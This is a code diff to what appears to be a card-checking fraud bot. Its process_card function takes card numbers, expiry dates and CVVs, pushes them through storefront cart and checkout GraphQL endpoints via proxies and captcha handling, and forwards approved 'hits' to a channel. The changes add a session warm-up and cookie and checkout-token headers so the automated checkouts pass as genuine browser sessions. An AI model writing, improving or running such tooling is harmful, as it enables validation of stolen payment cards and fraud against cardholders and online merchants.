@@ -735,6 +735,16 @@ def should_add_site_from_gateway_result(success, response_text):
         return True
     return is_decline_like_gateway_response(response_upper)
 
+def get_session_cookie_header(session, target_url):
+    """Build Cookie header from aiohttp session jar for target URL."""
+    try:
+        cookies = session.cookie_jar.filter_cookies(target_url)
+        if not cookies:
+            return ""
+        return "; ".join(f"{key}={morsel.value}" for key, morsel in cookies.items())
+    except Exception:
+        return ""
+
 async def forward_hit_message_to_channel(formatted_message, hit_status):
     """Forward approved results to HIT_CHANNEL with auto-disable on invalid peer."""
     global HIT_CHANNEL_FORWARDING_ENABLED
@@ -1346,10 +1356,18 @@ async def process_card(cc, mes, ano, cvv, site_url, user_id, proxy_str=None):
             connector = aiohttp.TCPConnector(ssl=False)
             timeout = aiohttp.ClientTimeout(total=30)
             
-            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
+            cookie_jar = aiohttp.CookieJar(unsafe=True)
+            async with aiohttp.ClientSession(connector=connector, timeout=timeout, cookie_jar=cookie_jar) as session:
                 url = ourl
                 cart = url + '/cart/add.js'
                 checkout = url + '/checkout/'
+
+                # Warm up storefront session and cookies before checkout flow.
+                try:
+                    async with session.get(url, headers=headers, proxy=proxy) as warmup_resp:
+                        await warmup_resp.read()
+                except Exception:
+                    pass
 
                 cart_headers = {
                     **headers,
@@ -1397,6 +1415,16 @@ async def process_card(cc, mes, ano, cvv, site_url, user_id, proxy_str=None):
                 if 'login' in checkout_url.lower():
                     await remove_dead_site(user_id, site_url)
                     return False, "LOGIN_REQUIRED", gateway, total_price, currency, receipt_id, order_url
+
+                def build_graphql_headers():
+                    req_headers = dict(headers)
+                    req_headers['Referer'] = checkout_url
+                    if sst:
+                        req_headers['x-checkout-one-session-token'] = sst
+                    cookie_header = get_session_cookie_header(session, checkout_url)
+                    if cookie_header:
+                        req_headers['Cookie'] = cookie_header
+                    return req_headers
 
                 queueToken = extract_between(text, 'queueToken&quot;:&quot;', '&quot;') or extract_between(text, '"queueToken":"', '"')
                 stableId = extract_between(text, 'stableId&quot;:&quot;', '&quot;') or extract_between(text, '"stableId":"', '"')
@@ -1520,8 +1548,9 @@ async def process_card(cc, mes, ano, cvv, site_url, user_id, proxy_str=None):
 
                 graphql_url = f'https://{urlparse(ourl).netloc}/checkouts/unstable/graphql'
                 
+                request_headers = build_graphql_headers()
                 response, resp_text, captcha_solved = await make_graphql_request_with_captcha_handling(
-                    session, graphql_url, params, headers, json_data, checkout_url, max_retries=1
+                    session, graphql_url, params, request_headers, json_data, checkout_url, max_retries=1
                 )
                 
                 if not response:
@@ -1679,8 +1708,9 @@ async def process_card(cc, mes, ano, cvv, site_url, user_id, proxy_str=None):
                 json_data['variables']['taxes']['proposedTotalAmount']['value']['amount'] = str(tax_amount)
                 json_data['variables']['buyerIdentity']['shopPayOptInPhone']['number'] = phone
 
+                request_headers = build_graphql_headers()
                 response, resp_text, captcha_solved = await make_graphql_request_with_captcha_handling(
-                    session, graphql_url, params, headers, json_data, checkout_url, max_retries=1
+                    session, graphql_url, params, request_headers, json_data, checkout_url, max_retries=1
                 )
                 
                 if is_captcha_required(resp_text):
@@ -1877,8 +1907,9 @@ async def process_card(cc, mes, ano, cvv, site_url, user_id, proxy_str=None):
 
                 text = ""
                 for submit_try in range(3):
+                    request_headers = build_graphql_headers()
                     response, text, captcha_solved = await make_graphql_request_with_captcha_handling(
-                        session, graphql_url, params, headers, submit_json_data, checkout_url, max_retries=1
+                        session, graphql_url, params, request_headers, submit_json_data, checkout_url, max_retries=1
                     )
 
                     if is_captcha_required(text):
@@ -1938,8 +1969,9 @@ async def process_card(cc, mes, ano, cvv, site_url, user_id, proxy_str=None):
                     }
                     for _ in range(10):
                         await asyncio.sleep(1.5)
+                        request_headers = build_graphql_headers()
                         response, final_text, captcha_solved = await make_graphql_request_with_captcha_handling(
-                            session, graphql_url, params, headers, poll_json_data,
+                            session, graphql_url, params, request_headers, poll_json_data,
                             checkout_url, max_retries=1
                         )
                         if is_captcha_required(final_text):
